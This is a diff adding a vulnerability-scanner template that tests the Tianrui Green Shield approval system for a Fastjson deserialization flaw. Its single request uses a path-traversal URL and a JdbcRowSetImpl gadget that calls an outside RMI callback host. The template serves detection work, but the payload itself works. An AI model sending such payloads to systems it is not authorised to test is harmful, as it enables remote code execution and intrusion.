@@ -1,0 +1,40 @@
+id: poc-yaml-tipray-gsas-editconfigval-fastjson-deserialization
+info:
+  name: Tianrui Green Shield Approval System editConfigVal Fastjson Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+
+variables:
+  random: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/conf/editConfigVal HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "@type": "com.sun.rowset.JdbcRowSetImpl",
+          "dataSourceName": "rmi://{{interactsh-url}}/{{random}}",
+          "autoCommit": true
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$" # Ensure body does not contain '<'
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
